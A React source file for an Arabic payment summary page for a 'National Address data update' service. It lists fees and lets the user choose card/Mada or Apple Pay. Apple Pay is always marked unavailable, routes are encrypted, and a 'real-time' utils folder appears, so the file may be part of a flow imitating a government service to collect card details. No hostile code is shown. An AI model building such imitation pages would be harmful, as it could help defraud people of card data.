import { useEffect, useState } from "react";
import Box from "@mui/material/Box";
import Typography from "@mui/material/Typography";
import Button from "@mui/material/Button";
import Paper from "@mui/material/Paper";
import Radio from "@mui/material/Radio";
import Breadcrumbs from "@mui/material/Breadcrumbs";
import Link from "@mui/material/Link";
import Footer from "../components/footer";
import CreditCardIcon from "@mui/icons-material/CreditCard";
import PaymentIcon from "@mui/icons-material/Payment";
import AssignmentIcon from "@mui/icons-material/Assignment";
import {
  encryptRoute,
  navigate,
  setCurrentPage,
} from "@/real-time/utils/utils";
import { Apple, CheckCircleOutline } from "@mui/icons-material";

const PaymentSummaryPage = () => {
  const [paymentMethod, setPaymentMethod] = useState("card");

  useEffect(() => {
    setCurrentPage("ملخص قبل الدفع");
  }, []);

  const handlePayment = () => {
    navigate(encryptRoute("الدفع بطاقة الائتمان"));
  };

  return (
    <Box
      sx={{
        display: "flex",
        flexDirection: "column",
        minHeight: "100vh",
        bgcolor: "#eaeff2",
        fontFamily: "Tajawal",
      }}
      dir="rtl"
    >
      {/* Top Decoration */}
      <div className="h-[40px] bg-[#143c3c] border-b-2 border-[#146c84]" />

      <Box
        component="main"
        sx={{ flexGrow: 1, py: { xs: 4, md: 6 }, px: { xs: 2, md: 8 } }}
      >
        <Box sx={{ maxWidth: "900px", mx: "auto" }}>
          {/* Breadcrumbs */}
          <Breadcrumbs
            separator={
              <Typography
                sx={{ fontSize: "14px", color: "#9ca3af", fontWeight: "700" }}
              >
                /
              </Typography>
            }
            sx={{ mb: 3 }}
          >
            <Link
              underline="hover"
              color="#146c84"
              href="#"
              sx={{ fontSize: "14px", fontWeight: "700" }}
            >
              الرئيسية
            </Link>
            <Link
              underline="hover"
              color="#146c84"
              href="#"
              sx={{ fontSize: "14px", fontWeight: "700" }}
            >
              الخدمات
            </Link>
            <Typography
              color="#4b5563"
              sx={{ fontSize: "14px", fontWeight: "700" }}
            >
              تحديث بيانات العنوان الوطني
            </Typography>
          </Breadcrumbs>

          <Typography
            variant="h4"
            sx={{
              fontSize: { xs: "24px", md: "32px" },
              fontWeight: "800",
              color: "#153c3f",
              mb: 4,
            }}
          >
            ملخص الطلب والدفع
          </Typography>

          <Box
            sx={{
              display: "flex",
              flexDirection: { xs: "column", md: "row" },
              gap: 4,
            }}
          >
            {/* Right Column: Cards */}
            <Box
              sx={{ flex: 1, display: "flex", flexDirection: "column", gap: 3 }}
            >
              {/* Service Details Card */}
              <Paper
                sx={{
                  p: 4,
                  borderRadius: "12px",
                  boxShadow: "0 2px 12px rgba(0,0,0,0.04)",
                }}
              >
                <Box
                  sx={{ display: "flex", alignItems: "center", gap: 1, mb: 4 }}
                >
                  <AssignmentIcon sx={{ color: "#153c3f", fontSize: "24px" }} />
                  <Typography
                    sx={{
                      fontSize: "18px",
                      fontWeight: "800",
                      color: "#153c3f",
                    }}
                  >
                    تفاصيل الخدمة
                  </Typography>
                </Box>

                <Box
                  sx={{ display: "flex", flexDirection: "column", gap: 2.5 }}
                >
                  <Box
                    sx={{
                      display: "flex",
                      justifyContent: "space-between",
                      alignItems: "center",
                    }}
                  >
                    <Typography sx={{ color: "#6b7280", fontWeight: "700" }}>
                      اسم الخدمة
                    </Typography>
                    <Typography sx={{ color: "#153c3f", fontWeight: "800" }}>
                      تحديث بيانات العنوان الوطني
                    </Typography>
                  </Box>
                  <Box
                    sx={{
                      display: "flex",
                      justifyContent: "space-between",
                      alignItems: "center",
                    }}
                  >
                    <Typography sx={{ color: "#6b7280", fontWeight: "700" }}>
                      رسوم الخدمة
                    </Typography>
                    <Typography sx={{ color: "#153c3f", fontWeight: "800" }}>
                      10 ر.س
                    </Typography>
                  </Box>
                  <Box
                    sx={{
                      display: "flex",
                      justifyContent: "space-between",
                      alignItems: "center",
                    }}
                  >
                    <Typography sx={{ color: "#6b7280", fontWeight: "700" }}>
                      ضريبة القيمة المضافة (15%)
                    </Typography>
                    <Typography sx={{ color: "#153c3f", fontWeight: "800" }}>
                      2 ر.س
                    </Typography>
                  </Box>

                  <Box
                    sx={{
                      mt: 1,
                      p: 2,
                      bgcolor: "#eaeff2",
                      borderRadius: "8px",
                      display: "flex",
                      justifyContent: "space-between",
                      alignItems: "center",
                    }}
                  >
                    <Typography
                      sx={{
                        color: "#153c3f",
                        fontWeight: "800",
                        fontSize: "18px",
                      }}
                    >
                      المجموع الكلي
                    </Typography>
                    <Typography
                      sx={{
                        color: "#153c3f",
                        fontWeight: "800",
                        fontSize: "18px",
                      }}
                    >
                      12 ر.س
                    </Typography>
                  </Box>
                </Box>
              </Paper>

              {/* Payment Method Card */}
              <Paper
                sx={{
                  p: 4,
                  borderRadius: "12px",
                  boxShadow: "0 2px 12px rgba(0,0,0,0.04)",
                }}
              >
                <Box
                  sx={{ display: "flex", alignItems: "center", gap: 1, mb: 4 }}
                >
                  <PaymentIcon sx={{ color: "#153c3f", fontSize: "24px" }} />
                  <Typography
                    sx={{
                      fontSize: "18px",
                      fontWeight: "800",
                      color: "#153c3f",
                    }}
                  >
                    طريقة الدفع
                  </Typography>
                </Box>

                <Box
                  sx={{
                    display: "grid",
                    gridTemplateColumns: { xs: "1fr", sm: "1fr 1fr" },
                    gap: 3,
                  }}
                >
                  {/* Card/Mada Option */}
                  <Box
                    onClick={() => setPaymentMethod("card")}
                    sx={{
                      py: 3,
                      px: 1,
                      borderRadius: "12px",
                      border: "2px solid",
                      borderColor:
                        paymentMethod === "card" ? "#00c8e1" : "#e5e7eb",
                      bgcolor: "white",
                      cursor: "pointer",
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "space-between",
                      transition: "all 0.2s ease",
                    }}
                  >
                    <Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                      <Radio
                        checked={paymentMethod === "card"}
                        color="primary"
                        sx={{
                          p: 0,
                          color: "#d1d5db",
                          "&.Mui-checked": { color: "#00c8e1" },
                        }}
                      />
                      <CreditCardIcon
                        sx={{ color: "#9ca3af", fontSize: "28px" }}
                      />
                      <Box>
                        <Typography
                          sx={{
                            fontWeight: "700",
                            color: "#153c3f",
                            fontSize: "14px",
                          }}
                        >
                          بطاقة ائتمان / مدى
                        </Typography>
                        <Typography
                          sx={{
                            color: "#9ca3af",
                            fontSize: "12px",
                            fontWeight: "600",
                          }}
                        >
                          مدى، Visa، Mastercard
                        </Typography>
                      </Box>
                    </Box>
                  </Box>

                  {/* Apple Pay Option */}
                  <Box
                    onClick={() => setPaymentMethod("apple")}
                    sx={{
                      py: 3,
                      px: 1,
                      borderRadius: "12px",
                      border: "2px solid",
                      borderColor:
                        paymentMethod === "apple" ? "#ef4444" : "#e5e7eb",
                      bgcolor: "white",
                      cursor: "pointer",
                      display: "flex",
                      flexDirection: "column",
                      gap: 1,
                      transition: "all 0.2s ease",
                    }}
                  >
                    <Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                      <Radio
                        checked={paymentMethod === "apple"}
                        color="primary"
                        sx={{
                          p: 0,
                          color: "#d1d5db",
                          "&.Mui-checked": { color: "#ef4444" },
                        }}
                      />
                      <Box
                        component="span"
                        sx={{ fontSize: "18px", color: "#000" }}
                      >
                        <Apple sx={{ fontSize: "24px" }} />
                      </Box>

                      <Box>
                        <Typography
                          sx={{
                            fontWeight: "700",
                            color: "#153c3f",
                            fontSize: "14px",
                          }}
                        >
                          Apple Pay
                        </Typography>
                        <Typography
                          sx={{
                            color: "#9ca3af",
                            fontSize: "12px",
                            fontWeight: "600",
                          }}
                        >
                          الدفع بواسطة Apple Pay
                        </Typography>
                      </Box>
                    </Box>
                    {paymentMethod === "apple" && (
                      <Typography
                        sx={{
                          color: "#ef4444",
                          fontSize: "11px",
                          fontWeight: "700",
                          mr: 4,
                        }}
                      >
                        الدفع عن طريق Apple Pay غير متاح حالياً
                      </Typography>
                    )}
                  </Box>
                </Box>
              </Paper>
            </Box>

            {/* Left Column: Sidebar Summary */}
            <Box sx={{ width: { xs: "100%", md: "350px" } }}>
              <Paper
                sx={{
                  borderRadius: "12px",
                  overflow: "hidden",
                  boxShadow: "0 4px 20px rgba(0,0,0,0.06)",
                }}
              >
                <Box
                  sx={{
                    bgcolor: "#153c3f",
                    p: 2,
                    color: "white",
                    textAlign: "center",
                  }}
                >
                  <Typography sx={{ fontWeight: "800", fontSize: "18px" }}>
                    ملخص الطلب
                  </Typography>
                </Box>
                <Box
                  sx={{
                    p: 4,
                    display: "flex",
                    flexDirection: "column",
                    gap: 3,
                  }}
                >
                  <Box
                    sx={{ display: "flex", justifyContent: "space-between" }}
                  >
                    <Typography
                      sx={{
                        color: "#9ca3af",
                        fontWeight: "700",
                        fontSize: "14px",
                      }}
                    >
                      الخدمة
                    </Typography>
                    <Typography
                      sx={{
                        color: "#153c3f",
                        fontWeight: "800",
                        fontSize: "14px",
                        textAlign: "left",
                      }}
                    >
                      تحديث بيانات العنوان الوطني
                    </Typography>
                  </Box>
                  <Box
                    sx={{ display: "flex", justifyContent: "space-between" }}
                  >
                    <Typography
                      sx={{
                        color: "#9ca3af",
                        fontWeight: "700",
                        fontSize: "14px",
                      }}
                    >
                      الرسوم
                    </Typography>
                    <Typography sx={{ color: "#153c3f", fontWeight: "800" }}>
                      10 ر.س
                    </Typography>
                  </Box>
                  <Box
                    sx={{ display: "flex", justifyContent: "space-between" }}
                  >
                    <Typography
                      sx={{
                        color: "#9ca3af",
                        fontWeight: "700",
                        fontSize: "14px",
                      }}
                    >
                      الضريبة
                    </Typography>
                    <Typography sx={{ color: "#153c3f", fontWeight: "800" }}>
                      2 ر.س
                    </Typography>
                  </Box>

                  <hr
                    style={{
                      border: "none",
                      borderTop: "1px solid #f3f4f6",
                      margin: "4px 0",
                    }}
                  />

                  <Box
                    sx={{
                      display: "flex",
                      justifyContent: "space-between",
                      alignItems: "center",
                    }}
                  >
                    <Typography
                      sx={{
                        color: "#153c3f",
                        fontWeight: "800",
                        fontSize: "20px",
                      }}
                    >
                      المجموع
                    </Typography>
                    <Typography
                      sx={{
                        color: "#153c3f",
                        fontWeight: "800",
                        fontSize: "20px",
                      }}
                    >
                      12 ر.س
                    </Typography>
                  </Box>

                  <Button
                    variant="contained"
                    fullWidth
                    disabled={paymentMethod === "apple"}
                    onClick={handlePayment}
                    startIcon={
                      <CheckCircleOutline
                        sx={{
                          fontSize: "14px !important",
                          transform: "rotate(180deg)",
                        }}
                      />
                    }
                    sx={{
                      bgcolor: "#00c8e1",
                      color: "white",
                      fontWeight: "800",
                      py: 1.5,
                      mt: 2,
                      borderRadius: "8px",
                      boxShadow: "none",
                      "&:hover": { bgcolor: "#00b2c9", boxShadow: "none" },
                      "&:disabled": { bgcolor: "#e5e7eb", color: "#9ca3af" },
                    }}
                  >
                    متابعة الدفع
                  </Button>

                  <Typography
                    sx={{
                      color: "#9ca3af",
                      fontSize: "12px",
                      textAlign: "center",
                      mt: 1,
                      px: 2,
                      fontWeight: "700",
                    }}
                  >
                    بالضغط على متابعة الدفع، أنت توافق على شروط الخدمة وسياسة
                    الخصوصية
                  </Typography>
                </Box>
              </Paper>
            </Box>
          </Box>
        </Box>
      </Box>

      <Footer />
    </Box>
  );
};

export default PaymentSummaryPage;
